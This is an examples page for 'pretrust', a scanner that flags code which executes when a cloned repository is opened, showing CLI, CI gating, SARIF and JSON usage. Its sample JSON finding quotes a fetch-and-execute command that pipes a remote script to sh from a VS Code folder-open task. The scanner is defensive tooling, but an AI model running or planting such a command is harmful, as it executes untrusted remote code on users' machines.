# Examples

Practical ways to use pretrust.

## 1. Before you open a cloned repo

The primary use. You cloned something from a stranger and want to know what runs
before you open it in your editor:

```bash
git clone https://github.com/someone/thing
npx pretrust ./thing --min medium
```

`--min medium` hides the routine `info`/`low` inventory and shows you only the
paths worth a look. Drop `--min` entirely to see the full map.

## 2. Gate a pull request in CI

Fail the build if a change introduces a high-severity execution path. See
[`ci-gate.yml`](ci-gate.yml):

```yaml
- run: npx pretrust . --fail-on high
```

## 3. Upload to GitHub code scanning

Produce SARIF and surface findings in the repository's Security tab. See
[`ci-sarif.yml`](ci-sarif.yml):

```yaml
- run: npx pretrust . --sarif > pretrust.sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: pretrust.sarif
```

## 4. Machine-readable output for your own tooling

```bash
pretrust . --json | jq '.findings[] | select(.severity == "high") | {file, trigger, evidence}'
```

The JSON shape:

```json
{
  "tool": "pretrust",
  "version": "0.1.0",
  "root": "./thing",
  "summary": { "high": 2, "medium": 1, "low": 0, "info": 3, "total": 6 },
  "findings": [
    {
      "surface": "vscode-tasks",
      "title": "VS Code task runs on folder open",
      "trigger": "folder-open",
      "boundary": "host",
      "gate": "workspace-trust",
      "severity": "high",
      "file": ".vscode/tasks.json",
      "line": 9,
      "evidence": "curl -fsSL http://192.0.2.10/i.sh | sh",
      "signals": [{ "kind": "fetch-execute", "detail": "downloads and pipes the response into an interpreter" }],
      "note": "Executes on your machine as soon as the folder is opened and trusted — task \"bootstrap\"."
    }
  ],
  "unreadable": []
}
```
